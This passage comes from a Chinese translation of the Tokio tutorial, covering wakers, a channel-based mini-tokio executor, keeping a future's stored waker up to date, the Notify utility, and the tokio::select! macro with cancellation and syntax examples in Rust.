<p>运行了一个 async block，使用自定义的 delay  创建了一个 <code>Delay</code> future 实例并且调用了 <code>.await</code> 。然而，我们的目前为止的实现有一个重大的<strong>污点</strong>，那就是我们的执行者永远不会 sleep，执行者在持续不断的循环所有生成的 future 并且 poll 它们。大多数时候，future 们都没有准备好执行更多的工作并且会再次返回 <code>Poll:Pending</code> （所以应该需要有一定的间隔，而不是没有 sleep 的无限循环去 poll）。这个过程会大量消耗 CPU 资源并且通常并不高效。</p>
<p>理想情况下，我们希望 mini-tokio 只在 future 能够取得进展时才进行 poll 。这种情况会发生在当任务被阻塞时的资源准备好去执行被请求的操作的时候。如果任务想要从一个 TCP socket 读取数据，那么我们只希望当 TCP socket 已经接收到数据的时候才去 poll 任务（而不是 socket 里啥都没有的时候去疯狂 poll） 。在我们的场景下，任务被阻塞直到给出的 <code>Istant</code> 到达，理想情况下，mini-tokio 应该只在那一时刻刚过后去 poll 任务。</p>
<p>为了实现这个目的，当一个资源被 poll，并且这个资源<strong>没有</strong>准备好时，这个资源将会在它转变成 ready state 的时候主动发送一个通知。</p>
<h2 id="wakers-唤醒者"><a class="header" href="#wakers-唤醒者">Wakers （唤醒者）</a></h2>
<p>Waker 是缺失的部分，这是资源能够通知正在等待的任务资源已准备好继续某些操作的一个系统（换句话说就是 waker 负责通知外面等我的那个任务，告诉它我准备好了，来 poll 我吧）。</p>
<p>让我们再看看 <code>Future::poll</code> 的定义：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn poll(self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context)
    -&gt; Poll&lt;Self::Output&gt;;
<span class="boring">}
</span></code></pre></pre>
<p>可以发现想要 poll future 的时候需要携带一个 <a href="https://doc.rust-lang.org/std/task/struct.Context.html"><code>Context</code></a> ，而它有一个 <code>waker()</code> 方法，这个方法返回一个 <a href="https://doc.rust-lang.org/std/task/struct.Waker.html"><code>Waker</code></a> 绑定到当前任务。这个 <a href="https://doc.rust-lang.org/std/task/struct.Waker.html"><code>Waker</code></a> 有一个 <code>wake()</code> 方法，这个方法正是我们要的，调用这个方法会发送信号给 executor，表示相关联的任务应该被调度来执行了。当资源转变成 ready state 的时候调用 <code>wake()</code> 方法来通知 executor 可以 poll 任务来获取进展。</p>
<h3 id="updating-delay"><a class="header" href="#updating-delay">Updating <code>Delay</code></a></h3>
<p>我们可以更新 <code>Delay</code> 来使用 wakers ：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::future::Future;
use std::pin::Pin;
use std::task::{Context, Poll};
use std::time::{Duration, Instant};
use std::thread;

struct Delay {
    when: Instant,
}

impl Future for Delay {
    type Output = &amp;'static str;

    fn poll(self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context&lt;'_&gt;)
        -&gt; Poll&lt;&amp;'static str&gt;
    {
        if Instant::now() &gt;= self.when {
            println!(&quot;Hello world&quot;);
            Poll::Ready(&quot;done&quot;)
        } else {
            // Get a handle to the waker for the current task
            let waker = cx.waker().clone();
            let when = self.when;

            // Spawn a timer thread.
            thread::spawn(move || {
                let now = Instant::now();

                if now &lt; when {
                    thread::sleep(when - now);
                }

                waker.wake();
            });

            Poll::Pending
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>现在，一旦指定的时间到了，调用的任务会通知 executor 并且 executor 能够确保任务再次被调度。下一步就是更新 mini-tokio 来监听 wake notifications（通知）。</p>
<p>这里我们的 <code>Delay</code> 实现仍然留有一些问题。我们将会在后面修复它们。</p>
<blockquote>
<p>当一个 future 返回 <code>Poll::Pending</code> ，它<strong>必须</strong>确保 waker 是在某一点被注册了。忘记这么做会导致任务被无限期地挂起（因为没 waker 去通知 executor 来 poll 了）。</p>
<p>忘记在返回 <code>Poll::Pending</code> 后 wake 一个 task 是一个常见的 bug 来源。</p>
</blockquote>
<p>回看一下 <code>Delay</code> 的第一次迭代。这是 future 的实现：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl Future for Delay {
    type Output = &amp;'static str;

    fn poll(self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context&lt;'_&gt;)
        -&gt; Poll&lt;&amp;'static str&gt;
    {
        if Instant::now() &gt;= self.when {
            println!(&quot;Hello world&quot;);
            Poll::Ready(&quot;done&quot;)
        } else {
            // Ignore this line for now.
            cx.waker().wake_by_ref();
            Poll::Pending
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>当时被注释暂时先忽略的那一行：咱返回 <code>Poll::Pending</code> 前，我们调用了 <code>cx.waker().wake_by_ref()</code> 。这是为了满足 future 的约定。通过返回 <code>Poll::Pending</code> 我们负责向 waker 发送 wake 信号。。因为我们暂时还没有实现 timer thread，所以我们直接用 inline 的方式向 waker 发送了信号。这么做会导致这个 future 被立即再调度(re-scheduled)，再次执行，并且可能还是没有转变成 ready state 。</p>
<p>请注意，你可以更频繁的向 waker 发送信号，而不必是必须必要的时候才发送信号。在这种特殊情况下，我们向 waker 发送信号，即使我们根本还没准备好继续操作。除了会浪费一些 CPU 资源外没有任何不对的。然而这种特殊的实现将会导致一个 busy loop 。</p>
<h3 id="updating-mini-tokio"><a class="header" href="#updating-mini-tokio">Updating Mini Tokio</a></h3>
<p>接下来就是改变我们的 Mini Tokio 来接收 waker notifications 。我们希望 executor 只在它们被唤醒的时候执行任务，为了做到这点， Mini tokio 将会提供它自己的 waker 。当这个 waker 被调用，它所关联的任务就会排队来执行。Mini-Tokio 在 poll future 的时候会把它的 waker 传递给 future。</p>
<p>更新后的 Mini Tokio 将会使用一个 channel 来存储被调度的任务。channel 允许从任何线程来排队执行任务。Wakers 必须是实现了 <code>Send</code> 和 <code>Sync</code> 的，因此我们可以使用来此 <a href="https://docs.rs/crossbeam/latest/crossbeam/channel/index.html"><code>crossbeam</code></a> crate 的 channel，因为标准库的 channel 没实现 <code>Sync</code> 。</p>
<blockquote>
<p><code>Send</code> 和 <code>Sync</code> traits 是 Rust 提供的关于并发的“标记 trait“。能被 <strong>send</strong> 到不同线程的类型是 <code>Send</code> 。大多数类型都是 <code>Send</code> ，但是有些像 <a href="https://doc.rust-lang.org/std/rc/struct.Rc.html"><code>Rc</code></a> 这样的不是。类型能被通过不可变引用被<strong>并发</strong>访问的是 <code>Sync</code> 。一个类型可以是 <code>Send</code> 但不一定是 <code>Sync</code> — 一个很好的例子就是 <a href="https://doc.rust-lang.org/std/cell/struct.Cell.html"><code>Cell</code></a> ，可以通过不可变引用来修改内容（内部可变性），因此通过并发访问是不安全的。</p>
<p>更多细节可以看  <a href="https://doc.rust-lang.org/book/ch16-04-extensible-concurrency-sync-and-send.html">the Rust book 中相关的章节</a> 。</p>
</blockquote>
<p>把下面的依赖加到 <code>Cargo.toml</code> 来获取我们需要的 channel 。</p>
<pre><code class="language-toml">crossbeam = &quot;0.8&quot;
</code></pre>
<p>然后改 <code>MiniTokio</code> 结构体。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use crossbeam::channel;
use std::sync::Arc;

struct MiniTokio {
    scheduled: channel::Receiver&lt;Arc&lt;Task&gt;&gt;,
    sender: channel::Sender&lt;Arc&lt;Task&gt;&gt;,
}

struct Task {
    // This will be filled in soon.
}
<span class="boring">}
</span></code></pre></pre>
<p>Wakers 是 <code>Sync</code> 并且可以被 clone。当 <code>wake</code> 被调用，任务必须被调度来执行。为了实现这个目的，我们整了个 channel 。当 <code>wake()</code> 在 waker 身上被调用时，任务会被推进 channel 的 send 的那一半（channel 被拆成两半，一半 send 一半 receive）。我们的 <code>Task</code> 结构体将会实现 wake 逻辑。为了做到这点，它需要同时包含生成的任务和 channel 的 send 。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::sync::{Arc, Mutex};

struct Task {
    // The `Mutex` is to make `Task` implement `Sync`. Only
    // one thread accesses `future` at any given time. The
    // `Mutex` is not required for correctness. Real Tokio
    // does not use a mutex here, but real Tokio has
    // more lines of code than can fit in a single tutorial
    // page.
    future: Mutex&lt;Pin&lt;Box&lt;dyn Future&lt;Output = ()&gt; + Send&gt;&gt;&gt;,
    executor: channel::Sender&lt;Arc&lt;Task&gt;&gt;,
}

impl Task {
    fn schedule(self: &amp;Arc&lt;Self&gt;) {
        self.executor.send(self.clone());
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>为了调度任务，<code>Arc</code> 会被 clone 然后通过 channel 发送出去。现在，我们需要将我们的 <code>schedule</code> 函数和 <a href="https://doc.rust-lang.org/std/task/struct.Waker.html"><code>std::task::Waker</code></a> 挂钩。标注版酷提供了一个低层次 API ，通过 <a href="https://doc.rust-lang.org/std/task/struct.RawWakerVTable.html">manual vtable construction</a> （手动构造 vtable，vtable 能够产生晚绑定行为，只有在运行时才知道调用的是什么函数，例如调用 vtable 中的 A，然后会把 A 映射的函数指针 *B 拿出来执行）来做这件事。这个方案为实现者提供了最大程度的灵活性，但是要求一大堆 unsafe 样板代码。与直接使用 <a href="https://doc.rust-lang.org/std/task/struct.RawWakerVTable.html"><code>RawWakerVTable</code></a> 相反，我们将会使用  <a href="https://docs.rs/futures/"><code>futures</code></a> crate 提供的 <a href="https://docs.rs/futures/0.3/futures/task/trait.ArcWake.html"><code>ArcWake</code></a> trait，它允许我们通过实现一个简单的 trait 来暴露我们的 <code>Task</code> 结构体作为一个 waker 。</p>
<p>把下面的依赖加入到 <code>Cargo.toml</code>。</p>
<pre><code class="language-toml">futures = &quot;0.3&quot;
</code></pre>
<p>然后实现  <a href="https://docs.rs/futures/0.3/futures/task/trait.ArcWake.html"><code>futures::task::ArcWake</code></a> 。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use futures::task::{self, ArcWake};
use std::sync::Arc;
impl ArcWake for Task {
    fn wake_by_ref(arc_self: &amp;Arc&lt;Self&gt;) {
        arc_self.schedule();
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>当之前的那个 timer thread 调用 <code>waker.wake()</code> ，任务会被推进 channel 。接着我们实现一下 <code>MiniTokio::run()</code> 函数中的接收并执行任务的部分。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>impl MiniTokio {
    fn run(&amp;self) {
        while let Ok(task) = self.scheduled.recv() {
            task.poll();
        }
    }

    /// 初始化 mini-tokio 实例
    fn new() -&gt; MiniTokio {
        let (sender, scheduled) = channel::unbounded();

        MiniTokio { scheduled, sender }
    }

    /// 生成一个 future 加到 mini-tokio 实例上
    /// 
    /// 把接收到的 future 包装进 `Task` ，`Task` 可以把自己发送到
    /// `scheduled` queue。然后里面包装的 future 就能在 mini-redis 实例的
    /// `run` 调用中被拿出来执行了。
    fn spawn&lt;F&gt;(&amp;self, future: F)
    where
        F: Future&lt;Output = ()&gt; + Send + 'static,
    {
        Task::spawn(future, &amp;self.sender);
    }
}

impl Task {
    fn poll(self: Arc&lt;Self&gt;) {
        // 从 `Task` 创建一个 waker。这使用了上面我们给 `Task`
        // 实现的 `ArcWake` trait，这个 `waker` 方法就是 `ArcWake` 的，
        // 用来从实现了 `ArcWake` trait 的类型上生成一个 waker 
        let waker = task::waker(self.clone());
        let mut cx = Context::from_waker(&amp;waker);

        // No other thread ever tries to lock the future
        let mut future = self.future.try_lock().unwrap();

        // Poll the future
        let _ = future.as_mut().poll(&amp;mut cx);
    }

    // Spawns a new task with the given future.
    //
    // Initializes a new Task harness containing the given future and pushes it
    // onto `sender`. The receiver half of the channel will get the task and
    // execute it.
    fn spawn&lt;F&gt;(future: F, sender: &amp;channel::Sender&lt;Arc&lt;Task&gt;&gt;)
    where
        F: Future&lt;Output = ()&gt; + Send + 'static,
    {
        let task = Arc::new(Task {
            future: Mutex::new(Box::pin(future)),
            executor: sender.clone(),
        });

        let _ = sender.send(task);
    }

}
<span class="boring">}
</span></code></pre></pre>
<p>这里发生了很多事情。首先，<code>MiniTokio::run()</code> 被实现了，这个函数启动了一个 loop 从 channel 接收被调度的任务。因为任务在被唤醒的时候会被推进这个 channel，所以这些任务能够在要执行的时候顺利取得进展。</p>
<p>此外，<code>MiniTokio::new()</code> 和 <code>MiniTokio::spawn()</code> 函数被调整为使用一个 channel 而不是一个 <code>VecDeque</code> 。当新的任务产生，它们会被给到这个 channel 的 send 的 clone，使得任务可以在运行时调度自己（通过把自己塞进 send 里送到 channel 中去）。</p>
<p><code>Task::poll()</code> 函数会通过手动为  <code>Task</code> 实现的 <code>future</code> crate 中的  <a href="https://docs.rs/futures/0.3/futures/task/trait.ArcWake.html"><code>ArcWake</code></a> trait 来创建 waker 。这个 waker 被用来创建一个 <code>task::Context</code> ，然后这个 <code>task::Context</code> 被传给 <code>poll</code> 。</p>
<h2 id="summary-概括"><a class="header" href="#summary-概括">Summary （概括）</a></h2>
<p>我们现在已经看到了异步 Rust 如何工作的端到端示例。Rust 的 <code>async/await</code> 特性由 traits  支持。这就允许了第三方 crates，像 Tokio，来提供执行细节。</p>
<ul>
<li>
<p>异步 Rust 的操作是惰性的，并且需要一个调用者去 poll 它们。</p>
</li>
<li>
<p>Waker 会被传递给 futures 来把一个 future 和调用它的任务联系起来。</p>
</li>
<li>
<p>当一个资源<strong>没有</strong>准备好完成一个操作时，会返回 <code>Poll::Pending</code> 并且任务的 waker 会记录这点。</p>
</li>
<li>
<p>当资源 ready 时，任务的 waker 会发送通知。</p>
</li>
<li>
<p>executor 接收到通知并且调度任务去执行。</p>
</li>
<li>
<p>当任务再次被 poll 的时候，此时资源已经就绪了，并且任务会取得进展。</p>
</li>
</ul>
<h2 id="a-few-loose-ends-一些零散的内容放在结尾"><a class="header" href="#a-few-loose-ends-一些零散的内容放在结尾">A few loose ends （一些零散的内容放在结尾）</a></h2>
<p>回想一下，当我们之前在实现 <code>Delay</code> 这个 future 的时候，我们说过还有一些事情需要解决。Rust 的异步模型允许单个 future 在多个任务之前迁移。思考下下面的内容：</p>
<pre><pre class="playground"><code class="language-rust">use futures::future::poll_fn;
use std::future::Future;
use std::pin::Pin;

#[tokio::main]
async fn main() {
    let when = Instant::now() + Duration::from_millis(10);
    let mut delay = Some(Delay { when });

    poll_fn(move |cx| {
        let mut delay = delay.take().unwrap();
        let res = Pin::new(&amp;mut delay).poll(cx);
        assert!(res.is_pending());
        tokio::spawn(async move {
            delay.await;
        });

        Poll::Ready(())
    }).await;
}
</code></pre></pre>
<p><code>poll_fn</code> 函数使用闭包创建了一个 <code>Future</code> 实例，上面的片段中创建一个 <code>Delay</code> 实例，poll 了一下它，然后把 <code>Delay</code> 实例发送到了一个新的任务中去进行 <code>.await</code> 。在这个例子里， <code>Delay::poll</code> 被<strong>不同</strong>的 <code>Waker</code> 调用了超过一次。当发生这种情况，你必须确保在 传递给了<em>最近的</em> 那次 <code>poll</code> 的 <code>Waker</code> 上的 <code>wake</code> 被调用。</p>
<p>当实现一个 future 的时候，假设每次对 <code>poll</code> 的调用<strong>可能</strong>被应用到一个不同的 <code>Waker</code>  实例是非常重要的。poll 函数必须更新任何先前记录的 waker 为最新传给它的 waker 。</p>
<p>我们先前实现的 <code>Delay</code> 在每次被 poll 的时候都会生成一个新的线程。这当然也 ok，但是如果它被 poll 的太频繁的话就会变得非常低效。（e.g. 如果你对这个 future 和其它 future 使用了 <code>select!</code> ，那么不论他俩哪个发生了事件，两者都会被调用）。一种方法是记住你是否已经创建过一个线程，并且只在你没有创建过时去生成一个新线程。然而，如果你这么做了，你必须确保线程的 <code>Waker</code> 被更新为最近的一次 poll 的 <code>Waker</code> ，因为你不这么做的话就无法唤醒最近的那个 <code>Waker</code> 。</p>
<p>为了修复前面的那个实现，我们可以像这样做：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::future::Future;
use std::pin::Pin;
use std::sync::{Arc, Mutex};
use std::task::{Context, Poll, Waker};
use std::thread;
use std::time::{Duration, Instant};

struct Delay {
    when: Instant,
    // 当我们已经生成了一个线程时这里是 Some，否则是 None。
    waker: Option&lt;Arc&lt;Mutex&lt;Waker&gt;&gt;&gt;,
}

impl Future for Delay {
    type Output = ();

    fn poll(mut self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context&lt;'_&gt;) -&gt; Poll&lt;()&gt; {
        // 首先，如果这是 future 第一次被调用，那就生成一个 timer thread。
        // 如果 timer thread 已经在运行了，确保存储的 `Waker` 匹配当前任务的 waker。
        if let Some(waker) = &amp;self.waker {
            let mut waker = waker.lock().unwrap();

            // 检查存储的 waker 是否匹配当前任务的 waker。
            // 当 `Delay` future 在可能会被移动到不同的任务 `poll` 时，
            // 这是很有必要的。如果这种情况发生了，`Context` 中包含的 waker 会不一样
            // 并且我们必须更新我们在 `Delay` 存储的 waker 来应对变化。
            if !waker.will_wake(cx.waker()) {
                *waker = cx.waker().clone();
            }
        } else {
            let when = self.when;
            let waker = Arc::new(Mutex::new(cx.waker().clone()));
            self.waker = Some(waker.clone());

            // 这是第一次调用 `poll` 的情况，生成一个 timer thread。
            thread::spawn(move || {
                let now = Instant::now();

                if now &lt; when {
                    thread::sleep(when - now);
                }

                // The duration has elapsed. Notify the caller by invoking
                // the waker.
                let waker = waker.lock().unwrap();
                waker.wake_by_ref();
            });
        }

        // 一旦 waker 被存储了，并且 timer thread 开始了，就到了检查
        // delay 是否完成的时候了。这通过检查当前的 instant 来做到。
        // 如果时间到了，那么就意味着 future 已经完成，并且得返回 `Poll::Ready`
        if Instant::now() &gt;= self.when {
            Poll::Ready(())
        } else {
            // 时间还没到，future 还没完成，返回 `Poll::Pending`。
            //
            // `Future` trait 约定了：当 `Pending` 被返回时，future 确保
            // 一旦再次被 poll 就会往给定的 waker 发送信号。在我们的情况下，
            // 通过在这返回 `Pending`，我们承诺一旦请求的时间过了，我们将会调用包含在 `Context`
            // 参数内的 waker。我们通过在上面生成一个 timer thread 来确保这点。
            //
            // 如果我们忘记调用 waker，这个任务将会无期限的挂起。
            Poll::Pending
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>这有一点复杂，但是我们的想法是，对每个 <code>poll</code> 的调用，future 都会检查当前 <code>poll</code> 给的 waker 跟之前记录的 waker 是不是匹配的。如果两个 waker 匹配，那么就不会做其它的事情了。如果它们不匹配，那么就记录最新的 <code>poll</code> 里的 waker。</p>
<h3 id="notify-utility"><a class="header" href="#notify-utility"><code>Notify</code> utility</a></h3>
<p>我们演示了如果使用 waker 来手动实现 <code>Delay</code> future。Wakers 是异步 Rust 如何去工作的基础。通常，没有必要去降低到那样的 level（手动实现 future 是一种偏向底层的行为）。举个例子，在这个 <code>Delay</code> 的场景，我们可以通过使用 <a href="https://docs.rs/tokio/1/tokio/sync/struct.Notify.html"><code>tokio::sync::Notify</code></a> 实用工具纯使用 <code>async/await</code> 来实现它。这个实用工具提供了一个基本的任务通知机制，它会处理 waker 的细节，包括确保记录的 waker 匹配当前的 task 。</p>
<p>使用 <a href="https://docs.rs/tokio/1/tokio/sync/struct.Notify.html"><code>Notify</code></a> ，我们可以像这样使用 <code>await</code> 实现一个 <code>delay</code> 函数：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use tokio::sync::Notify;
use std::sync::Arc;
use std::time::{Duration, Instant};
use std::thread;

async fn delay(dur: Duration) {
    let when = Instant::now() + dur;
    let notify = Arc::new(Notify::new());
    let notify2 = notify.clone();

    thread::spawn(move || {
        let now = Instant::now();

        if now &lt; when {
            thread::sleep(when - now);
        }

        notify2.notify_one();
    });


    notify.notified().await;
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="select"><a class="header" href="#select">Select</a></h2>
<p>目前为止，我们想要为系统增加并发的话，我们需要生成一个新的任务。我们现在将介绍一些其它的方式来使用 Tokio 并发的执行异步代码。</p>
<h2 id="tokioselect"><a class="header" href="#tokioselect"><code>tokio::select!</code></a></h2>
<p>这个 <code>tokio::select!</code> 宏允许在多个异步计算上等待并且在<strong>单个</strong>计算完成时返回。</p>
<p>举个例子：</p>
<pre><pre class="playground"><code class="language-rust">use tokio::sync::oneshot;

#[tokio::main]
async fn main() {
    let (tx1, rx1) = oneshot::channel();
    let (tx2, rx2) = oneshot::channel();

    tokio::spawn(async {
        let _ = tx1.send(&quot;one&quot;);
    });

    tokio::spawn(async {
        let _ = tx2.send(&quot;two&quot;);
    });

    tokio::select! {
        val = rx1 =&gt; {
            println!(&quot;rx1 completed first with {:?}&quot;, val);
        }
        val = rx2 =&gt; {
            println!(&quot;rx2 completed first with {:?}&quot;, val);
        }
    }
}
</code></pre></pre>
<p>使用了两个 oneshot channel，它俩中的任何一个都可以第一个完成。<code>select!</code> 语句会在这两个 channel 上 await ，并且绑定 <code>val</code> 到任务的返回值上。当 <code>tx1</code> 或 <code>tx2</code> 完成，相关联的 block 会被执行。</p>
<p><strong>没有</strong>完成的分支会被直接 drop 掉。在这个例子中，计算会 await 在每个 channel 的 <code>oneshot::Receiver</code> 上。没有完成的 <code>oneshot::Receiver</code> 会被丢弃。</p>
<h3 id="cancellation"><a class="header" href="#cancellation">Cancellation</a></h3>
<p>在异步 Rust 中，取消表现为 drop 一个 future。回想一下 &quot;<a href="https://m4n5ter.github.io/rust/mini-redis/async_in_depth.html">Async in depth</a>&quot;，异步 Rust 操作通过 future 实现，并且 future 是惰性的。只有 future 被 poll 了，才会有新的进展。如果 future 被 drop 了，那么相关联的状态也会被 drop ，也就是说不会再有新的进展了。</p>
<p>也就是说，有时异步操作会产生后台任务或启动在后台运行的其他操作。举个例子，再上面的示例中，一个任务被创建用来在背后发送消息，一般来说，任务将会执行一些计算来生成值。</p>
<p>Futures 或者其它类型可以实现 <code>Drop</code> 来清理背后的资源。Tokio 的 <code>oneshot::Receiver</code> 通过往 <code>Sender</code> 发送一个关闭信号来实现 <code>Drop</code> 。这个收到关闭信号的 sender 会通过 drop 来中断正在执行的操作。</p>
<pre><pre class="playground"><code class="language-rust">use tokio::sync::oneshot;

async fn some_operation() -&gt; String {
    // Compute value here
}

#[tokio::main]
async fn main() {
    let (mut tx1, rx1) = oneshot::channel();
    let (tx2, rx2) = oneshot::channel();

    tokio::spawn(async {
        // Select on the operation and the oneshot's
        // `closed()` notification.
        tokio::select! {
            val = some_operation() =&gt; {
                let _ = tx1.send(val);
            }
            _ = tx1.closed() =&gt; {
                // `some_operation()` is canceled, the
                // task completes and `tx1` is dropped.
            }
        }
    });

    tokio::spawn(async {
        let _ = tx2.send(&quot;two&quot;);
    });

    tokio::select! {
        val = rx1 =&gt; {
            println!(&quot;rx1 completed first with {:?}&quot;, val);
        }
        val = rx2 =&gt; {
            println!(&quot;rx2 completed first with {:?}&quot;, val);
        }
    }
}
</code></pre></pre>
<h3 id="the-future-implementation"><a class="header" href="#the-future-implementation">The <code>Future</code> implementation</a></h3>
<p>为了更好的理解 <code>select!</code> 的工作方式，让我们看一下假设的 <code>Future</code> 实现会是什么样子。这是一个简化版本，在实践中，<code>select!</code> 包含了其它的功能，例如随机选择第一个被 poll 的分支。</p>
<pre><pre class="playground"><code class="language-rust">use tokio::sync::oneshot;
use std::future::Future;
use std::pin::Pin;
use std::task::{Context, Poll};

struct MySelect {
    rx1: oneshot::Receiver&lt;&amp;'static str&gt;,
    rx2: oneshot::Receiver&lt;&amp;'static str&gt;,
}

impl Future for MySelect {
    type Output = ();

    fn poll(mut self: Pin&lt;&amp;mut Self&gt;, cx: &amp;mut Context&lt;'_&gt;) -&gt; Poll&lt;()&gt; {
        if let Poll::Ready(val) = Pin::new(&amp;mut self.rx1).poll(cx) {
            println!(&quot;rx1 completed first with {:?}&quot;, val);
            return Poll::Ready(());
        }

        if let Poll::Ready(val) = Pin::new(&amp;mut self.rx2).poll(cx) {
            println!(&quot;rx2 completed first with {:?}&quot;, val);
            return Poll::Ready(());
        }

        Poll::Pending
    }
}

#[tokio::main]
async fn main() {
    let (tx1, rx1) = oneshot::channel();
    let (tx2, rx2) = oneshot::channel();

    // use tx1 and tx2

    MySelect {
        rx1,
        rx2,
    }.await;
}
</code></pre></pre>
<p>这个 <code>MySelect</code> future 包含了每个分支的 future。当 <code>MySelect</code> 被 poll，第一个分支会被 pol，如果它就绪了，它返回出来的 val 就会被用掉，并且 <code>MySelect</code> 会立即结束。在 <code>.await</code> 从 future 收到输出后，future 会被 drop 掉，这导致 future 内的两个分支也会被 drop 。因为有一个分支没有完成，这个分支的操作实际上被取消了。</p>
<p>记住上一节的内容：</p>
<blockquote>
<p>当一个 future 返回 <code>Poll::Pending</code> ，它<strong>必须</strong>确保 waker 是在某一点被注册了。忘记这么做会导致任务被无限期地挂起</p>
</blockquote>
<p>在这个 <code>MySelect</code> 实现中，没有显式的使用 <code>Context</code> 参数。相反，这个 waker 要求通过在内部传递 <code>cx</code> 给内部的 future 满足了。因为内部的 future 也必须满足 waker 要求，通过仅在从内部 future 接收到 <code>Poll::Pending</code> 时返回 <code>Poll::Pending</code> 来满足，所以 <code>MySelect</code> 也满足了 waker 要求。（用我的理解就是 <code>MySelect</code> 靠内部的分支返回 <code>Poll::Ready</code> 时它也返回 <code>Poll::Ready</code> ，内部分支返回 <code>Poll::Pending</code> 时它也返回 <code>Poll::Pending</code> 来隐式的满足了上面引用中的要求 ）</p>
<h2 id="syntax语法"><a class="header" href="#syntax语法">Syntax（语法）</a></h2>
<p>这个 <code>select!</code> 宏可以处理多于两个分支的情况，目前的限制是 64 个分支（可以通过在宏里继续多处理一些分支 ，但是因为 64 个分支已经够多了，一直再宏里增加分支上限也不优雅）。每个分支像这样构成：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>&lt;pattern&gt; = &lt;async expression&gt; =&gt; &lt;handler&gt;,
<span class="boring">}
</span></code></pre></pre>
<p>当 <code>select</code> 宏被执行，所有的 <code>&lt;async expression&gt;</code> 会被聚合起来，然后并发执行。当有一个表达式率先完成，表达式的结果会被匹配到 <code>&lt;pattern&gt;</code> 。如果结果匹配了模式，那么所有剩余的 <code>&lt;async expression&gt;</code> 会被 drop 掉，并且完成了的那个表达式的 <code>&lt;handler&gt;</code> 被执行。<code>&lt;handler&gt;</code> 表达式可以访问 <code>&lt;pattern&gt;</code> 建立的任何绑定。</p>
<p><code>&lt;pattern&gt;</code> 最基本的情况就是一个变量名，<code>&lt;async expression&gt;</code> 的结果会被绑定到这个变量名，并且 <code>&lt;handler&gt;</code> 能访问这个变量。这就是为什么最开始的例子里在 <code>&lt;pattern&gt;</code> 和 <code>&lt;handler&gt;</code> 被使用的 <code>val</code> 是访问的 <code>&lt;async expression&gt;</code> 的 <code>val</code> 。</p>
<p>如果 <code>&lt;pattern&gt;</code> <strong>没有</strong>成功匹配异步计算的结果，那么剩下的异步表达式继续并发执行，直到出现下一个先执行完的 <code>&lt;async expression&gt;</code> 。然后相同的逻辑会继续应用到结果上，以此类推。</p>
<p>因为 <code>select!</code> 可以携带任何异步表达式，所以在 select 上定义更加复杂的计算变得有可能了。</p>
<p>这里，我们 select 一个 <code>oneshot</code> 输出个一个 TCP connection。</p>
<pre><pre class="playground"><code class="language-rust">use tokio::net::TcpStream;
use tokio::sync::oneshot;

#[tokio::main]
async fn main() {
    let (tx, rx) = oneshot::channel();

    // Spawn a task that sends a message over the oneshot
    tokio::spawn(async move {
        tx.send(&quot;done&quot;).unwrap();
    });

    tokio::select! {
        socket = TcpStream::connect(&quot;localhost:3465&quot;) =&gt; {
            println!(&quot;Socket connected {:?}&quot;, socket);
        }
        msg = rx =&gt; {
            println!(&quot;received message first {:?}&quot;, msg);
        }
    }
}
</code></pre></pre>
<p>这里，我们 select 一个 oneshot 和从 <code>TcpListener</code> 接收 sockets 。</p>
<pre><pre class="playground"><code class="language-rust">use tokio::net::TcpListener;
use tokio::sync::oneshot;
use std::io;

#[tokio::main]
async fn main() -&gt; io::Result&lt;()&gt; {
    let (tx, rx) = oneshot::channel();

    tokio::spawn(async move {
        tx.send(()).unwrap();
    });

    let mut listener = TcpListener::bind(&quot;localhost:3465&quot;).await?;

    tokio::select! {
        _ = async {
            loop {
                let (socket, _) = listener.accept().await?;
                tokio::spawn(async move { process(socket) });
            }

            // Help the rust type inferencer out
            Ok::&lt;_, io::Error&gt;(())
        } =&gt; {}
        _ = rx =&gt; {
            println!(&quot;terminating accept loop&quot;);
        }
    }

    Ok(())
}
</code></pre></pre>
<p>这个 accept loop 会一直运行直到遇到 error 或者 <code>rx</code> 收到一个值。<code>_</code> 模式表示我们对异步计算返回的值并不感兴趣。</p>
<h2 id="return-value"><a class="header" href="#return-value">Return value</a></h2>
<p><code>tokio::select!</code> 宏会返回 <code>&lt;handler&gt;</code> 表达式计算出的结果。</p>
<pre><pre class="playground"><code class="language-rust">async fn computation1() -&gt; String {
    // .. computation
}

async fn computation2() -&gt; String {
    // .. computation
}

#[tokio::main]
async fn main() {
    let out = tokio::select! {
        res1 = computation1() =&gt; res1,
        res2 = computation2() =&gt; res2,
    };

    println!(&quot;Got = {}&quot;, out);
}
</code></pre></pre>
<p>因为这个，它要求<strong>每个</strong>分支的 <code>&lt;handler&gt;</code> 表达式计算出同样的类型。如果 <code>select!</code> 的输出不被需要，一个不错的实践是让表达式返回 <code>()</code></p>
<h2 id="errors"><a class="header" href="#errors">Errors</a></h2>
